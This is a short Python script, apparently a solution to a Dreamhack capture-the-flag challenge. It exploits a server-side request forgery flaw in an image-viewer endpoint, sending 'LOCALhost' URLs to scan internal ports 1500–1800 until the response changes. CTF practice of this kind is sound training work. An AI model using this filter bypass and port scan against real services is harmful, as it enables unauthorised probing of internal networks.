import requests


def send(home_url, url):
    data = {
        "url": url,
    }
    response = requests.post(home_url, data=data)
    return response.text


if __name__ == "__main__":
    home_url = "http://host1.dreamhack.games:19870/img_viewer"
    # <img src="data:image/png;base64, iVBORw0KGgoAAAA~~~~>
    img_src_base64 = "iVBORw0KGgoAAAA"

    for port in range(1500, 1800 + 1):
        url = f"http://LOCALhost:{port}"
        if img_src_base64 not in send(home_url, url):
            print(f"port number : {port}")
            break
